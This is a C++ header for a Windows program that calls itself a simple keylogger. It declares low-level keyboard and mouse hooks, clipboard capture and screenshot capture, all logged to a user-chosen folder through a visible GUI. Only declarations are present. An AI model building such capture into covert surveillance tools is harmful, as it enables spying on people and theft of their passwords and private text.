// The main window of a simple keylogger program

#pragma once
#include "BaseWindow.h"
#include <Windows.h>
#include <map>
#include <unordered_set>
#include <string>
#include <iostream>
#include <fstream>

class MainWindow : public BaseWindow<MainWindow>
{
	// Indicates whether the program is actively capturing:
	static BOOL capturing;

	// Variables related to file input/output:
	static std::wstring logFolderName;
	static std::wstring logFileName;
	static std::wofstream logFile;

	// Variables related to keystroke capture:
	static BOOL leftShiftDown;
	static BOOL rightShiftDown;
	static BOOL leftControlDown;
	static BOOL rightControlDown;
	static BOOL leftAltDown;
	static BOOL rightAltDown;
	static BOOL capsLockOn;
	static std::map<WCHAR, WCHAR> shiftedCharacters;
	static std::unordered_set<WCHAR> letters;

	// Variables related to screenshot capture:
	static int screenshotIndex;

	// GUI elements are manually added to the main window as child windows.
	// Here are the HWND handles for them:
	HWND selectLogFolderButton;
	HWND startCapturingButton;
	HWND staticLabel;

	// Unique identifiers for each child window:
	const int chooseLogFileButtonID = 201;
	const int startCapturingButtonID = 202;
	const int staticLabelID = 203;

	// Fixed sizes for various elements on the GUI:
	const int standard_margin = 15;
	const int button_height = 25;
	const int choose_log_folder_button_width = 160;
	const int toggle_capture_button_width = 115;

	/*****************************************************
	 * Private functions related to the Main Window GUI  *
	 *****************************************************/

	// Sets the name of the Window Class.
	PCWSTR ClassName() const;
	// Instantiates all child elements of the GUI window.
	void GenerateGUI();
	// Fills the GUI screen with a solid color.
	void OnPaint();
	// Repositions all elements in the GUI.
	void Resize();
	// Displays a File Open Dialog whenever the Select Log Folder button is clicked.
	int SelectLogFolderOnClick();
	// Toggles a boolean variable to allow logging to begin.
	int StartCapturingOnClick();

	/*****************************************************
	* Private functions related to clipboard capture     *
	******************************************************/

	// Logs any textual content of the clipboard to the log file.
	void CaptureClipboardContents();

	/*****************************************************
	* Private functions related to keystroke capture     *
	******************************************************/

	// Processes a WM_KEYDOWN event intercepted by the keyboard hook.
	static WCHAR* translateKeyDown(PKBDLLHOOKSTRUCT p);
	// Processes a WM_KEYUP event intercepted by the keyboard hook.
	static WCHAR* translateKeyUp(PKBDLLHOOKSTRUCT p);
	// Processes a WM_SYSKEYUP event intercepted by the keyboard hook.
	static WCHAR* translateSysKeyUp(PKBDLLHOOKSTRUCT p);
	// Processes a WM_SYSKEYDOWN event intercepted by the keyboard hook.
	static WCHAR* translateSysKeyDown(PKBDLLHOOKSTRUCT p);

	/*****************************************************
	* Private functions related to screen capture        *
	******************************************************/

	// Takes a screenshot of the primary display and saves it to a .bmp file in the log folder.
	static void takeScreenshot(int screenshotIndex);
	// Retrieves metadata about a bitmap stored in memory.
	static PBITMAPINFO getBitmapMetadata(HBITMAP memoryBitmap);
	// Draws crosshairs on a screenshot to indicate where the user clicked.
	static void markCursorPosition(HDC memoryContext, int width, int height);
	// Writes the bitmap stored in memBmp to a new file with the specified filename.
	static void WriteBMP(LPCWSTR filename, PBITMAPINFO pbmi, HBITMAP memBmp, HDC memContxt);
	
public:
	// Obligatory message handler for the main window's message queue.
	LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam);

	// Keyboard hook event handler
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	// Mouse hook event handler.
	static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);

};

